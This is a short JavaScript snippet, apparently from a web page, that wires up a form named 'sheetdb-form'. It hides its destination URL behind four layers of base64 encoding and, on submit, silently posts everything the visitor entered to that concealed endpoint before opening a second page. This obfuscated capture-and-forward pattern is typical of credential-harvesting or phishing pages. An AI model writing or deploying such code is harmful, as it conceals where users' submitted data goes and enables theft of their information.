//Your Mom Cute 🥺
let conc = "V1ZWb1UwMUhUa2xVVkZwTlpWUnNObGxWWkZkaVIxSklWVzFzVFdKWGVESlVSRXBIWkRKR1ZFOVVTazVWZW14M1ZERlNZV1JIVG5GVmJsSnFUV3BHTVZRd1VrcE9VVDA5"
conc = atob(conc);conc = atob(conc);conc = atob(conc);conc = atob(conc);
var form = document.getElementById('sheetdb-form');
form.addEventListener("submit", e => {
  e.preventDefault();
  fetch(conc, {
      method : "POST",
      body: new FormData(document.getElementById("sheetdb-form")),
  }).then(
      response => response.json()
  ).then((html) => {
    // you can put any JS code here
    window.open('page2.html', '_blank')
  });
});
